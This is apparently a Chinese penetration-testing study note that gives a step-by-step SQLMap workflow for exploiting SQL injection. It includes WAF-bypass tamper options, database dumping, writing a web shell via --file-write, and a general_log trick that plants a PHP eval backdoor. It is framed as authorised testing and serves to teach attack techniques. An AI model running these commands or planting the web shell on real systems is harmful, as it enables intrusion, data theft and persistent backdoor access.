# SQL 注入点工具化利用全面工作流

> **这篇文档的定位**：前面整个 SQL 注入系列笔记（《MySQL入门笔记》《SQL注入全数据库类型实战笔记》《SQL注入实战进阶笔记》《HTTP请求头注入面与增删改查注入思路笔记》《SQL盲注原理笔记》《MySQL高权限注入利用笔记》《堆叠注入与二次注入笔记》）讲的都是**原理**——你需要先吃透这些，才能看懂 SQLMap 在干什么、在它失效时知道该怎么手工补救。这篇文档讲的是**流程**：真实渗透测试中碰到一个疑似注入点，怎么把"手动一步步试"切换成"SQLMap 自动跑"，以及**SQLMap 在每一步可能卡住时，你该手动做什么**。配合《SQLMap工作原理笔记》一起看效果最好——那篇讲清楚了 SQLMap 每一步"底层在干嘛、等价于哪个手工方法"，这篇讲清楚"这一步该不该交给它、它卡住了我该怎么办"。

---

## 总览：五个阶段

```
阶段 0：信息收集与输入准备 —— 在交给 SQLMap 之前，你自己要先搞清楚什么
阶段 1：基础探测 —— 把请求喂给 SQLMap，看它能确认出什么
阶段 2：按探测结果分支处理 —— 成功 / 部分成功 / 全部失败，分别怎么办
阶段 3：确认权限，决定利用上限 —— 偷数据，还是进一步拿 Shell
阶段 4：收尾
```

---

## 阶段 0：信息收集与输入准备

> 这一阶段 SQLMap **帮不了你**，必须自己手动完成，原因是这些判断需要结合业务上下文，而 SQLMap 只会机械地测试你喂给它的请求本身。

### 0.1 确认功能背后的 CRUD 类型

对照《HTTP请求头注入面与增删改查注入思路笔记》第二节——先猜这个功能大概率是 SELECT/INSERT/UPDATE/DELETE 中的哪一种。**这一步决定了你对后续结果的预期**：如果是 INSERT/UPDATE/DELETE 类型，那 SQLMap 大概率只能靠报错注入/盲注/堆叠拿到结果，不会出现联合查询成功的情况——提前有这个预期，能避免你在"为什么这里联合查询一直不成功"上浪费排查时间。

### 0.2 确认数据提交方式与数据格式

对照《HTTP请求头注入面与增删改查注入思路笔记》第一节 + 《SQL注入实战进阶笔记》第三节——这个参数是 URL 参数、POST 表单、Cookie，还是某个请求头？数据格式是裸参数，还是被包进了 XML/JSON，甚至再套了一层 Base64 编码？

**这一步直接决定了阶段 1 该怎么构造输入给 SQLMap**：
- 裸参数（URL/表单）→ 直接用 `-u` 或 `-r` 丢请求文件即可，SQLMap 能自动识别。
- JSON 格式请求体 → SQLMap 较新版本能自动识别 JSON 结构并测试其中的字段，但**不是所有版本/场景都能可靠识别**，保险做法是用 `--data` 显式提供请求体，并在怀疑的字段值后面手动加一个 `*` 号告诉 SQLMap"重点测这里"。
- **被 Base64（或其他方式）编码过的字段** → 这是 SQLMap **完全无法自动判断**的情况，它不知道"这个字段的值，后端会先解码再使用"。这种情况下交给 SQLMap 测试原始的裸 payload 几乎必然失败（因为后端解码出来的是乱码，根本没走到 SQL 拼接那一步），**必须你自己先确认哪个字段被编码了，再决定用 `--tamper=base64encode.py` 之类的脚本，让 SQLMap 在发送前自动对 payload 做一次同样的编码**（详见《SQLMap使用指南》第四节）。

### 0.3 用 Burp 抓一份干净的请求包

把目标请求在 Burp 里完整抓下来，"Copy to file" 保存成 `.txt`，后续全程用 `-r request.txt` 喂给 SQLMap——这是最不容易出错、也最方便后续反复调试的方式，比每次手打 `-u`/`--data`/`--cookie` 参数更可靠。

---

## 阶段 1：基础探测

```bash
sqlmap -r request.txt --batch
```

`--batch` 让 SQLMap 遇到交互式询问时全部选默认选项，适合你已经通过阶段 0 判断过、心里对结果有预期的情况下快速跑一遍。

**这一步你要做的事**：不是"跑完等结果"，而是**对照《SQLMap工作原理笔记》第四节的那张对照表，看它最终确认了哪几种技术（B/E/U/S/T）**，这决定了你接下来走阶段 2 的哪个分支。

---

## 阶段 2：按探测结果分支处理

### 分支 A：确认成功，且命中了联合查询（U）或报错注入（E）

效率最高的情况，直接进入数据提取：

```bash
sqlmap -r request.txt --batch --current-db
sqlmap -r request.txt --batch --tables -D "库名"
sqlmap -r request.txt --batch --dump -C "列名" -T "表名" -D "库名"
```

对照《SQLMap使用指南》第二节，不需要额外手工介入。

### 分支 B：确认成功，但只有布尔盲注（B）或时间盲注（T）

说明页面没有回显位、也不报错。这种情况下**数据提取会明显变慢**（一个字符一个字符猜），这是正常现象，不代表哪里出了问题，耐心等即可；如果特别着急，可以考虑用 `--threads` 适当提高并发（但注意授权测试环境下不要把并发开太大，避免对目标造成不必要的压力）。

### 分支 C：全部技术均失败 —— 这是最需要你手动介入的情况

这是整篇文档的核心部分。SQLMap 报告"没有发现注入"，**不代表没有注入**，只代表它内置的标准 payload 形态在这个点上没有生效。按下面的顺序逐一排查：

#### C1：怀疑是 WAF / 过滤规则拦截了标准 payload

**手动操作**：
```bash
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" -v 3
```
把流量接到 Burp，**在 Burp 的 HTTP History 里亲眼看 SQLMap 实际发出的请求和对应的响应**——这一步是手工判断的关键，不要只看 SQLMap 命令行的输出。观察响应是不是被 WAF 拦截页面取代了（常见特征：返回了一个和正常业务响应完全不同的页面，内容类似"检测到非法请求"）。

确认是 WAF 拦截后，**进一步手工判断是哪类特征触发了拦截**——比如手动在 Burp Repeater 里，把 SQLMap 刚才发出的那条 payload 拿出来，手动删减/替换其中的关键字（比如先去掉空格看看、再把 `UNION` 换成大小写混写看看），**用最小改动反推出 WAF 到底在匹配什么规则**，再针对性选用对应的 tamper 脚本（详见《SQLMap使用指南》第四节），而不是把所有 tamper 脚本挨个试一遍——那样效率很低。

```bash
sqlmap -r request.txt --tamper=space2comment,randomcase --batch
```

#### C2：怀疑注入点落在 INSERT/UPDATE/DELETE，但 SQLMap 测的不是真正的参数

回到阶段 0.1 的判断——如果你确认这个功能背后是写操作类型，先**手动确认 SQLMap 到底在测哪个参数**：

```bash
sqlmap -r request.txt -p "具体参数名" --batch
```

用 `-p` 显式指定，避免 SQLMap 默认测试了一堆无关参数、却漏掉了你真正怀疑的那一个（尤其是一次请求里参数很多的情况）。如果怀疑这里可能支持堆叠查询（对照《堆叠注入与二次注入笔记》第一节判断"后端是否可能用了支持多语句的接口"——这个判断本身只能靠经验和业务线索，SQLMap 测不出来），可以强制只测这一种技术，减少其他技术的干扰：

```bash
sqlmap -r request.txt -p "具体参数名" --technique=S --batch
```

#### C3：怀疑是二次注入（先存后用型）

这是**SQLMap 默认流程完全覆盖不到**的场景——它只会测试"当前这次请求，响应是否异常"，不知道"这份数据之后会不会在另一个页面被重新使用"。

**手动操作**（必须先做，SQLMap 做不了这一步）：按《堆叠注入与二次注入笔记》2.3 节的步骤，自己先用一个带无害指纹特征的 payload 完成写入（比如注册一个包含特殊字符的用户名），再手动挨个尝试"可能会重新使用这份数据"的功能点，**人工定位到真正触发的那个页面/接口**。

定位到之后，SQLMap 其实提供了一个专门应对这类场景的参数：

```bash
sqlmap -r register_request.txt --second-order="http://target.com/profile/update" --batch
```

`--second-order` 告诉 SQLMap："payload 从这个请求（注册）写进去，但请你去另一个指定的 URL（修改资料页）检查响应，而不是检查当前这次请求的响应"——**但这个参数的值，必须是你在手工排查阶段就已经确定好的那个"触发页面"**，SQLMap 自己无法帮你找出这个页面是哪个，这正是本阶段"手动先行、工具后接"的典型例子。

#### C4：怀疑注入点在请求头（UA / Referer / Cookie / 自定义头）

对照《HTTP请求头注入面与增删改查注入思路笔记》——**SQLMap 默认的 `--level=1` 只会测试 Cookie，不会测试 User-Agent 和 Referer**，这两个头部要到 `--level=3` 才会被纳入测试范围。

**手动操作**：
```bash
# 提高 level，让 SQLMap 覆盖更多默认不测的位置
sqlmap -r request.txt --level=3 --batch

# 或者显式声明要测试某个自定义头部
sqlmap -r request.txt --headers="X-Forwarded-For: 1*" --batch
```
注意第二种写法里手动加的那个 `*` 号——这是 SQLMap 的语法，用来**显式告诉它"就测这个位置"**，在它自己判断不出来、或者你想精确控制测试范围时很有用。

#### C5：怀疑数据格式本身是障碍（回到阶段 0.2）

如果前面 C1-C4 都排查过依然没有进展，回头重新确认阶段 0.2 的判断——**是不是整个请求体是被加密/编码过的**（参照《前端加密与代码混淆笔记》里讲的前端加密场景，有些业务不只是编码，甚至是真正的加密）。如果是真正的加密（不是单纯编码），**SQLMap 完全无法处理**，这种情况下已经超出了"换个参数、换个 tamper"能解决的范围，需要先手动逆向出前端的加密算法，自己写脚本在提交前完成加密，再把加密后的密文手动拼进请求，交给 SQLMap 做后续的盲注判断（这种高度定制化的场景，SQLMap 本身帮不上太多忙，更多是靠你自己写配合脚本）。

## 阶段 3：确认权限，决定利用上限

一旦阶段 2 确认了注入点，对照《MySQL高权限注入利用笔记》判断能走到哪一步：

```bash
sqlmap -r request.txt --batch --is-dba --privileges
```

### 分支：权限不够

老老实实停在"数据提取"这一层，用 `--dump` 拿关键数据即可，**不要在明知权限不够的情况下还去尝试 `--os-shell`**，白白浪费测试时间和请求次数。

### 分支：高权限（有 FILE 权限）

```bash
sqlmap -r request.txt --batch --file-write="shell.php" --file-dest="/var/www/html/x.php"
```

**如果这一步失败**（大概率是 `secure_file_priv` 限制了路径，对照《MySQL高权限注入利用笔记》第三节），**SQLMap 不会自动帮你切换到 `general_log` 写 Shell 这条迂回路线**，这又是一处必须手动介入的地方：

```bash
sqlmap -r request.txt --sql-shell
```
进入交互式 SQL 执行窗口后，**手动逐句敲入**《MySQL高权限注入利用笔记》第 3.4 节讲过的那几行语句：
```sql
set global general_log=on;
set global general_log_file='探测到的网站目录/bypass.php';
select '<?php @eval($_POST[x]);?>'
```
这一整套"绕过 `secure_file_priv`"的思路，完全依赖你对原理的理解去手动操作，SQLMap 的自动化参数里没有现成的一键开关。

---

## 阶段 4：收尾

- 确认测试目的已达成（拿到了目标数据，或验证了漏洞存在性）后，若在授权测试中留下了 `general_log`/Webshell 等痕迹，应按测试约定进行清理或向客户报告，不应留下可被他人利用的后门。
- 整理一份简要的漏洞复现记录（哪个参数、用了哪种技术、是否需要特殊 tamper/编码处理），方便复测和写报告时回溯。

| 遇到的情况 | 对应阶段 | 该做的手动操作 |
|---|---|---|
